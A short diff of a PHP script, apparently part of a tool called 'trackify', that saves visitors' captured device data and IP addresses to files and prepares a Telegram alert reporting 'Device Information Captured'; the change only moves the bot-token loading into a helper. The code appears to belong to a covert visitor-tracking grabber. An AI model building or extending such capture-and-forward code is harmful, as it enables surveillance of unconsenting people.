@@ -130,23 +130,11 @@ if (!empty($_POST['device_data'])) {
         file_put_contents($capDir . '/ip_pending.txt', $info, LOCK_EX);
         file_put_contents($capDir . '/saved.ip.txt', $info, FILE_APPEND | LOCK_EX);
         
-        // Send to Telegram if configured
-        // Try to load from config file
-        $telegram_token = '';
-        $telegram_chat = '';
-        $config_file = 'telegram_config.json';
-        
-        if (file_exists($config_file)) {
-            $config_content = file_get_contents($config_file);
-            $config = json_decode($config_content, true);
-            if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
-                $telegram_token = $config['bot_token'];
-                $telegram_chat = $config['chat_id'];
-            }
-        }
-        
-        // Check if Telegram is configured
-        if (!empty($telegram_token) && !empty($telegram_chat)) {
+        $tg = trackify_read_telegram_credentials();
+        $telegram_token = $tg['bot_token'] ?? '';
+        $telegram_chat = $tg['chat_id'] ?? '';
+
+        if ($telegram_token !== '' && $telegram_chat !== '') {
             // Format Telegram message
             $message = "🔔 *Device Information Captured*\n\n";
             $message .= "📍 *IP Address:* " . $ipaddress . "\n";
